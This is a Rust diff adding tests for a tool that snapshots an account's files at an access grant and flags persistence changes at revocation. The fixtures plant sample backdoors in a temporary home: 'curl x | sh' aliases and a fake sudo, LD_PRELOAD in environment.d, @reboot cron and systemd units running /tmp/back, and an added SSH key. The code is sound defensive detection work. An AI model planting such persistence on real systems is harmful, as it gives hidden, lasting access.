@@ -17,6 +17,12 @@ fn account() -> (User, PathBuf) {
 /// No host spool sources, so a test reads only files beneath the fake home.
 fn no_extra(_: &User, _: &mut dyn FnMut(String, io::Result<Vec<u8>>)) {}
 
+/// Nothing known about the account beyond its files: not shared, nothing
+/// left running, not privileged.
+fn no_facts(_: u32) -> Facts {
+    Facts::default()
+}
+
 /// The account itself for its uid, as the host's user database would.
 fn lookup(user: &User) -> impl Fn(u32) -> Option<User> + '_ {
     move |uid| (uid == user.uid.as_raw()).then(|| user.clone())
@@ -52,7 +58,20 @@ impl Granted {
             self.person,
             &[],
             &lookup(&self.user),
+            &no_facts,
             extra,
+            false,
+        )
+    }
+    /// The report with `facts` about the account.
+    fn report_with(&self, facts: Facts) -> Access {
+        since_grant(
+            &self.store,
+            self.person,
+            &[],
+            &lookup(&self.user),
+            &move |_| facts,
+            &no_extra,
             false,
         )
     }
@@ -269,6 +288,7 @@ fn a_rootless_record_is_never_vouched_for() {
         granted.person,
         &[granted.user.uid.as_raw()],
         &lookup(&granted.user),
+        &no_facts,
         &no_extra,
         true,
     );
@@ -289,13 +309,22 @@ fn a_missing_record_reads_not_checked() {
         person,
         &[user.uid.as_raw()],
         &lookup(&user),
+        &no_facts,
         &no_extra,
         false,
     );
     assert_eq!(live.state, State::NotChecked);
     assert_eq!(live.accounts[0].reason, Some(Reason::RecordMissing));
     assert_eq!(live.accounts[0].account, user.name);
-    let none = since_grant(&store, person, &[], &lookup(&user), &no_extra, false);
+    let none = since_grant(
+        &store,
+        person,
+        &[],
+        &lookup(&user),
+        &no_facts,
+        &no_extra,
+        false,
+    );
     assert_eq!(none.state, State::NotChecked);
     assert_eq!(none.reason, Some(Reason::RecordMissing));
     assert_eq!(none.accounts, []);
@@ -538,4 +567,295 @@ fn flood_probe() {
         account.unscanned.len(),
         account.files.len()
     );
+}
+
+/// Each watched place in [`WATCHED`] is detected: a file planted there after
+/// the grant is reported (one test for the whole table, so a place added to
+/// the table is covered by adding it there).
+#[test]
+fn every_watched_place_is_detected() {
+    let planted = std::sync::Arc::new(std::sync::atomic::AtomicBool::new(false));
+    let spool = planted.clone();
+    let extra = move |_: &User, visit: &mut dyn FnMut(String, io::Result<Vec<u8>>)| {
+        if spool.load(std::sync::atomic::Ordering::SeqCst) {
+            visit("crontab".into(), Ok(b"@reboot /tmp/back\n".to_vec()));
+        }
+    };
+    let granted = Granted::new(|_| {}, &extra);
+    for place in WATCHED {
+        let path = granted.home.join(place.path);
+        match place.watch {
+            Watch::File => {
+                std::fs::create_dir_all(path.parent().unwrap()).unwrap();
+                std::fs::write(&path, format!("planted in {}\n", place.path)).unwrap();
+            }
+            Watch::Directory | Watch::Units => {
+                std::fs::create_dir_all(&path).unwrap();
+                std::fs::write(
+                    path.join("planted.conf"),
+                    format!("planted in {}\n", place.path),
+                )
+                .unwrap();
+            }
+            Watch::Spools => {}
+        }
+    }
+    planted.store(true, std::sync::atomic::Ordering::SeqCst);
+    let files = granted.files(&extra);
+    for place in WATCHED {
+        let found = match place.watch {
+            Watch::Spools => files.iter().any(|f| f.path == "crontab"),
+            Watch::File => files.iter().any(|f| f.path == format!("~/{}", place.path)),
+            Watch::Directory | Watch::Units => files
+                .iter()
+                .any(|f| f.path == format!("~/{}/planted.conf", place.path)),
+        };
+        assert!(
+            found,
+            "{} ({}) was not detected: {files:?}",
+            place.path, place.category
+        );
+    }
+}
+
+/// J334 P1-2: the four places the scan did not look at: a unit enabled from
+/// `~/.local/share/systemd/user`, `environment.d`, `~/.bash_aliases`, and a
+/// program shadowing `sudo` in `~/.local/bin`.
+#[test]
+fn the_four_places_j334_found_unscanned_are_reported() {
+    let granted = Granted::new(|_| {}, &no_extra);
+    let home = &granted.home;
+    let share = home.join(".local/share/systemd/user");
+    std::fs::create_dir_all(share.join("default.target.wants")).unwrap();
+    std::fs::write(
+        share.join("j334back.service"),
+        "[Service]\nExecStart=/tmp/back\n",
+    )
+    .unwrap();
+    std::os::unix::fs::symlink(
+        "../j334back.service",
+        share.join("default.target.wants/j334back.service"),
+    )
+    .unwrap();
+    std::fs::create_dir_all(home.join(".config/environment.d")).unwrap();
+    std::fs::write(
+        home.join(".config/environment.d/50-j334.conf"),
+        "LD_PRELOAD=/tmp/x.so\n",
+    )
+    .unwrap();
+    std::fs::write(home.join(".bash_aliases"), "alias ls='curl x | sh'\n").unwrap();
+    std::fs::create_dir_all(home.join(".local/bin")).unwrap();
+    std::fs::write(home.join(".local/bin/sudo"), "#!/bin/sh\ncurl x | sh\n").unwrap();
+    let paths: Vec<String> = granted
+        .files(&no_extra)
+        .into_iter()
+        .map(|f| f.path)
+        .collect();
+    for expected in [
+        "~/.local/share/systemd/user/j334back.service",
+        "~/.local/share/systemd/user/default.target.wants/j334back.service",
+        "~/.config/environment.d/50-j334.conf",
+        "~/.bash_aliases",
+        "~/.local/bin/sudo",
+    ] {
+        assert!(
+            paths.iter().any(|p| p == expected),
+            "{expected} missing: {paths:?}"
+        );
+    }
+}
+
+/// J334 P1-1: a unit directory with more than 1024 names is not scanned, so
+/// the account is "not checked: incomplete", never "unchanged".
+#[test]
+fn a_directory_too_big_to_scan_is_never_unchanged() {
+    let granted = Granted::new(|_| {}, &no_extra);
+    let units = granted.home.join(".config/systemd/user");
+    std::fs::create_dir_all(&units).unwrap();
+    for index in 0..1100 {
+        std::fs::write(units.join(format!("pad{index}.conf")), "").unwrap();
+    }
+    std::fs::write(
+        units.join("j334big.service"),
+        "[Service]\nExecStart=/tmp/back\n",
+    )
+    .unwrap();
+    let access = granted.report(&no_extra);
+    let account = &access.accounts[0];
+    assert_eq!(account.state, State::NotChecked, "{account:?}");
+    assert_eq!(account.reason, Some(Reason::Incomplete));
+    assert!(
+        account
+            .unscanned
+            .iter()
+            .any(|name| name.contains("more than 1024 entries"))
+    );
+    assert_eq!(access.state, State::NotChecked);
+}
+
+/// J334 P3: a tree of many drop-in directories costs walks, not entries;
+/// past the directory bound the account is incomplete.
+#[test]
+fn too_many_directories_make_the_account_incomplete() {
+    let granted = Granted::new(|_| {}, &no_extra);
+    let units = granted.home.join(".config/systemd/user");
+    for index in 0..300 {
+        std::fs::create_dir_all(units.join(format!("u{index}.service.d"))).unwrap();
+    }
+    let account = &granted.report(&no_extra).accounts[0];
+    assert_eq!(account.reason, Some(Reason::Incomplete), "{account:?}");
+}
+
+/// J334 P2-4: `~/.ssh` kept as a link into the home (a dotfile manager's
+/// layout) is resolved inside the home, so a key added through it is shown.
+#[test]
+fn a_key_behind_a_symlinked_ssh_directory_is_reported() {
+    let granted = Granted::new(
+        |home| {
+            std::fs::create_dir_all(home.join(".dotfiles/ssh")).unwrap();
+            std::fs::write(
+                home.join(".dotfiles/ssh/authorized_keys"),
+                "ssh-ed25519 AAAAowner o\n",
+            )
+            .unwrap();
+            std::os::unix::fs::symlink(".dotfiles/ssh", home.join(".ssh")).unwrap();
+        },
+        &no_extra,
+    );
+    std::fs::write(
+        granted.home.join(".dotfiles/ssh/authorized_keys"),
+        "ssh-ed25519 AAAAowner o\nssh-ed25519 AAAAj334 left\n",
+    )
+    .unwrap();
+    let files = granted.files(&no_extra);
+    let keys = files
+        .iter()
+        .find(|f| f.path == "~/.ssh/authorized_keys")
+        .unwrap_or_else(|| panic!("{files:?}"));
+    assert_eq!(keys.lines, ["ssh-ed25519 AAAAj334 left"]);
+}
+
+/// A link among the directories that leaves the home is not followed, and
+/// the account is incomplete, never "unchanged".
+#[test]
+fn a_directory_link_leaving_the_home_makes_the_account_incomplete() {
+    let granted = Granted::new(
+        |home| std::os::unix::fs::symlink("/etc", home.join(".ssh")).unwrap(),
+        &no_extra,
+    );
+    let account = &granted.report(&no_extra).accounts[0];
+    assert_eq!(account.reason, Some(Reason::Incomplete), "{account:?}");
+    assert!(
+        account
+            .unscanned
+            .iter()
+            .any(|name| name.contains("leaves the home"))
+    );
+}
+
+/// J334 P2-3: a file there at the grant and gone now (the owner's mask that
+/// kept a unit off) is reported as removed.
+#[test]
+fn a_removed_mask_is_reported() {
+    let granted = Granted::new(
+        |home| {
+            let units = home.join(".config/systemd/user");
+            std::fs::create_dir_all(&units).unwrap();
+            std::os::unix::fs::symlink("/dev/null", units.join("j334masked.service")).unwrap();
+        },
+        &no_extra,
+    );
+    std::fs::remove_file(granted.home.join(".config/systemd/user/j334masked.service")).unwrap();
+    let files = granted.files(&no_extra);
+    assert_eq!(files.len(), 1, "{files:?}");
+    assert_eq!(files[0].path, "~/.config/systemd/user/j334masked.service");
+    assert_eq!(files[0].change, ChangeKind::Removed);
+}
+
+/// J334 P2-1 and P1-4: an account shared with others, whose programs may
+/// still run, or a privileged one, is never "unchanged"; listed files still
+/// read "changed".
+#[test]
+fn shared_or_privileged_accounts_are_never_unchanged() {
+    let granted = Granted::new(|_| {}, &no_extra);
+    let shared = granted.report_with(Facts {
+        shared: true,
+        programs_may_remain: true,
+        privileged: false,
+    });
+    assert_eq!(shared.accounts[0].reason, Some(Reason::ProgramsMayRemain));
+    assert!(shared.accounts[0].shared);
+    let privileged = granted.report_with(Facts {
+        shared: false,
+        programs_may_remain: false,
+        privileged: true,
+    });
+    assert_eq!(privileged.accounts[0].reason, Some(Reason::Privileged));
+    std::fs::write(granted.home.join(".bashrc"), "curl x | sh\n").unwrap();
+    let changed = granted.report_with(Facts {
+        shared: true,
+        programs_may_remain: true,
+        privileged: true,
+    });
+    assert_eq!(changed.accounts[0].state, State::Changed);
+}
+
+/// J334 P2-7: a failed recording leaves a marker; a later login does not
+/// record over it, and the revocation says recording failed.
+#[test]
+fn a_failed_recording_is_never_replaced_by_a_later_login() {
+    let (user, home) = account();
+    let store = home.join(".test-store");
+    let person = uuid::Uuid::new_v4();
+    // The record's own path is a directory, so its rename fails.
+    std::fs::create_dir_all(record_path(&store, person, user.uid.as_raw())).unwrap();
+    assert!(record_grant(&store, person, &user, &no_extra).is_err());
+    std::fs::write(home.join(".bashrc"), "curl x | sh\n").unwrap();
+    assert!(record_grant(&store, person, &user, &no_extra).is_ok());
+    let access = since_grant(
+        &store,
+        person,
+        &[],
+        &lookup(&user),
+        &no_facts,
+        &no_extra,
+        false,
+    );
+    assert_eq!(
+        access.accounts[0].reason,
+        Some(Reason::RecordFailed),
+        "{access:?}"
+    );
+    std::fs::remove_dir_all(home).unwrap();
+}
+
+/// J334 P2-2: a retried revocation, after the records were forgotten, sends
+/// the last report again instead of "no record".
+#[test]
+fn a_retry_sends_the_last_report_again() {
+    let granted = Granted::new(|_| {}, &no_extra);
+    std::fs::write(granted.home.join(".bashrc"), "curl x | sh\n").unwrap();
+    let first = granted.report(&no_extra);
+    forget(&granted.store, granted.person).unwrap();
+    let retry = since_grant(
+        &granted.store,
+        granted.person,
+        &[granted.user.uid.as_raw()],
+        &lookup(&granted.user),
+        &no_facts,
+        &no_extra,
+        false,
+    );
+    assert_eq!(retry, first);
+    assert_eq!(retry.state, State::Changed);
+}
+
+/// Each report says when its baseline was recorded and when it was scanned.
+#[test]
+fn a_report_carries_its_baseline_time() {
+    let granted = Granted::new(|_| {}, &no_extra);
+    let account = &granted.report(&no_extra).accounts[0];
+    assert!(account.recorded_at > 0 && account.scanned_at >= account.recorded_at);
+    assert_eq!(account.watched, WATCHED.len());
+    assert!(account.complete);
 }
